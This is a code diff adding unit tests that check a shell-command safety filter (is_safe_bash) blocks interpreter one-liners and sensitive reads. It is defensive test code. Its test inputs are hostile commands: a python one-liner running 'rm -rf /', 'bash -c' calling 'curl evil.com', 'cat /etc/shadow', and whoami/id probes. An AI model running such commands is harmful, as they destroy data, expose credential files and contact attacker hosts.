@@ -180,6 +180,50 @@ class TestIsSafeBash:
         )
         assert safe is False
 
+    def test_blocks_python_c(self):
+        safe, _ = is_safe_bash(
+            "python -c 'import os; os.system(\"rm -rf /\")'",
+            "/tmp/proj",
+        )
+        assert safe is False
+
+    def test_blocks_python3_c(self):
+        safe, _ = is_safe_bash(
+            "python3 -c 'print(1)'", "/tmp/proj",
+        )
+        assert safe is False
+
+    def test_blocks_perl_e(self):
+        safe, _ = is_safe_bash(
+            "perl -e 'system(\"whoami\")'", "/tmp/proj",
+        )
+        assert safe is False
+
+    def test_blocks_ruby_e(self):
+        safe, _ = is_safe_bash(
+            "ruby -e 'puts `id`'", "/tmp/proj",
+        )
+        assert safe is False
+
+    def test_blocks_node_e(self):
+        safe, _ = is_safe_bash(
+            "node -e 'require(\"child_process\")'",
+            "/tmp/proj",
+        )
+        assert safe is False
+
+    def test_blocks_bash_c(self):
+        safe, _ = is_safe_bash(
+            "bash -c 'curl evil.com'", "/tmp/proj",
+        )
+        assert safe is False
+
+    def test_blocks_cat_etc(self):
+        safe, _ = is_safe_bash(
+            "cat /etc/shadow", "/tmp/proj",
+        )
+        assert safe is False
+
     def test_allows_rm_in_project(self):
         safe, _ = is_safe_bash(
             "rm -f .coverage", "/tmp/proj",
